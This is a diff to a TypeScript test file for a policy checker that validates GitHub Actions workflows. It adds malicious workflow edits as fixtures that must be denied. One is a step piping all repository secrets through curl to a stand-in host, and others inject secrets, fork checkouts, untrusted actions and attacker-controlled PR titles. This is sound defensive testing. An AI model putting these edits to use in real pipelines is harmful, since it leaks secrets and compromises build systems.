@@ -67,9 +67,9 @@ const both = (change: Record<string, unknown> = {}) => ['agora/evidence', 'agora
 // The committed workflow files, optionally with one file replaced by an edited copy.
 const DRIVER = '.github/workflows/agora-ci.yml';
 const REPORTER = '.github/workflows/agora-report.yml';
-const workflows = (change: Record<string, string> = {}) => ({ files: { [DRIVER]: fs.readFileSync(DRIVER, 'utf8'), [REPORTER]: fs.readFileSync(REPORTER, 'utf8'), ...change } });
-interface Step { uses?: string; with?: Record<string, unknown>; env?: Record<string, string>; 'continue-on-error'?: boolean }
-interface Job { steps: Step[]; needs?: string[]; if?: string; environment?: string; permissions?: unknown; 'continue-on-error'?: boolean }
+const workflows = (change: Record<string, string> = {}, changed: string[] = []) => ({ changed_paths: changed, files: { [DRIVER]: fs.readFileSync(DRIVER, 'utf8'), [REPORTER]: fs.readFileSync(REPORTER, 'utf8'), ...change } });
+interface Step { uses?: string; run?: string; with?: Record<string, unknown>; env?: Record<string, string>; 'continue-on-error'?: boolean }
+interface Job { steps: Step[]; needs?: string[]; if?: string; environment?: string; permissions?: unknown; env?: Record<string, string>; 'continue-on-error'?: boolean }
 interface Workflow { on: unknown; permissions: unknown; jobs: Record<string, Job> }
 const at = <T>(value: T | undefined): T => { if (value === undefined) throw new Error('workflow fixture shape changed'); return value; };
 const job = (w: Workflow, name: string) => at(w.jobs[name]);
@@ -114,15 +114,31 @@ test('project lane 9 denies candidate-authored reports and wrong-workflow receip
 	expect(evaluate('workflows', workflows(), { policy: 'agora/trusted-checks.json' })).toMatchObject({ outcome: 'pass', denials: [] });
 	expect(denials('workflows', workflows(edit(DRIVER, w => { step(w, 'tests', 3).env = { KEY: '${{ secrets.AGORA_REPORTER_APP_KEY }}' }; })))).toEqual(['driver_secret_reference']);
 	expect(denials('workflows', workflows(edit(DRIVER, w => { w.on = { pull_request_target: {} }; w.permissions = { contents: 'write', checks: 'write' }; })))).toEqual(['driver_permissions', 'driver_trigger']);
-	expect(denials('workflows', workflows(edit(REPORTER, w => { at(step(w, 'report', 0).with)['ref'] = '${{ github.event.workflow_run.head_sha }}'; })))).toEqual(['reporter_candidate_reference']);
-	expect(denials('workflows', workflows(edit(REPORTER, w => { at(step(w, 'report', 0).with)['ref'] = 'refs/pull/1/merge'; })))).toEqual(['reporter_candidate_reference']);
-	expect(denials('workflows', workflows(edit(REPORTER, w => { job(w, 'report').steps.splice(2, 0, { uses: `actions/download-artifact@${BLOB}` }); delete job(w, 'report').environment; at(step(w, 'report', 3).env)['EXTRA'] = '${{ secrets.OTHER }}'; })))).toEqual(['reporter_environment', 'reporter_reads_candidate_artifact', 'reporter_unexpected_secret']);
+	// The reporter workflow must equal the policy allowlist exactly: each edit below passed the earlier text patterns.
+	const reporterEdits: ((w: Workflow) => void)[] = [
+		w => { at(step(w, 'report', 0).with)['ref'] = '${{ github.event.workflow_run.head_sha }}'; },
+		w => { at(step(w, 'report', 0).with)['ref'] = 'refs/pull/1/merge'; },
+		w => { job(w, 'report').steps.splice(2, 0, { uses: `actions/download-artifact@${BLOB}` }); },
+		w => { job(w, 'report').steps.push({ run: 'echo "${{ github.event.workflow_run.display_title }}"' }); },
+		w => { job(w, 'report').steps.push({ run: 'echo "${{ toJSON(secrets) }}" | curl -d @- https://example.invalid' }); },
+		w => { at(step(w, 'report', 2).env)['EXTRA'] = "${{ secrets['OTHER'] }}"; },
+		w => { job(w, 'report').env = { KEY: '${{ secrets.AGORA_REPORTING_SIGNING_KEY }}' }; },
+		w => { job(w, 'report').steps.splice(1, 0, { uses: `actions/checkout@${BLOB}`, with: { repository: 'someone/fork', ref: '${{ github.event.repository.default_branch }}', 'persist-credentials': false } }); },
+		w => { job(w, 'report').steps.splice(1, 0, { uses: `someone/action@${BLOB}` }); },
+		w => { delete job(w, 'report').environment; },
+		w => { delete job(w, 'report').if; },
+		w => { w.on = { workflow_run: { workflows: ['agora-ci', 'candidate'], types: ['completed', 'requested'] } }; },
+		w => { w.permissions = { actions: 'read', contents: 'read', 'pull-requests': 'read', checks: 'write' }; },
+		w => { job(w, 'report').permissions = { contents: 'write' }; },
+	];
+	for (const change of reporterEdits) expect(denials('workflows', workflows(edit(REPORTER, change)))).toEqual(['reporter_workflow_not_allowlisted']);
+	// Candidate edits to sensitive paths are read as paths and fail agora/policy; ordinary paths pass.
+	expect(evaluate('workflows', workflows({}, ['docs/site/index.md', 'packages/domain/src/index.ts', '.githubx/notes.md']))).toMatchObject({ outcome: 'pass', denials: [] });
+	expect(denials('workflows', workflows({}, ['.github/workflows/agora-report.yml', '.github/workflows/new.yml', 'agora/trusted-checks.json', 'scripts/trusted-report.mjs', 'docs/site/index.md']))).toEqual(['sensitive_path_changed:.github/workflows/agora-report.yml', 'sensitive_path_changed:.github/workflows/new.yml', 'sensitive_path_changed:agora/trusted-checks.json', 'sensitive_path_changed:scripts/trusted-report.mjs']);
+	expect(denials('workflows', { files: workflows().files })).toEqual(['changed_paths_missing']);
 	expect(denials('workflows', workflows(edit(DRIVER, w => { job(w, 'docs').steps[0] = { uses: 'actions/checkout@v7' }; })))).toEqual([`checkout_persists_credentials:${DRIVER}`, `unpinned_action:${DRIVER}:actions/checkout@v7`]);
 	expect(denials('workflows', workflows({ [DRIVER]: 'name: agora-ci\non: pull_request\n' }))).toEqual([`workflow_not_canonical_json:${DRIVER}`]);
 	expect(denials('workflows', workflows(edit(DRIVER, w => { job(w, 'tests').permissions = { checks: 'write' }; })))).toEqual(['driver_permissions']);
-	expect(denials('workflows', workflows(edit(REPORTER, w => { w.on = { workflow_run: { workflows: ['agora-ci', 'candidate'], types: ['completed', 'requested'] } }; })))).toEqual(['reporter_trigger']);
-	expect(denials('workflows', workflows(edit(REPORTER, w => { w.permissions = { actions: 'read', contents: 'read', 'pull-requests': 'read', checks: 'write' }; })))).toEqual(['reporter_permissions']);
-	expect(denials('workflows', workflows(edit(REPORTER, w => { job(w, 'report').permissions = { contents: 'write' }; })))).toEqual(['reporter_permissions']);
 	// Guard negative: in an isolated copy that trusts any App, the forged producer is no longer named.
 	const source = fs.readFileSync('scripts/trusted-checks.mjs', 'utf8');
 	const needle = 'row.app_id === project.reporter.app_id';
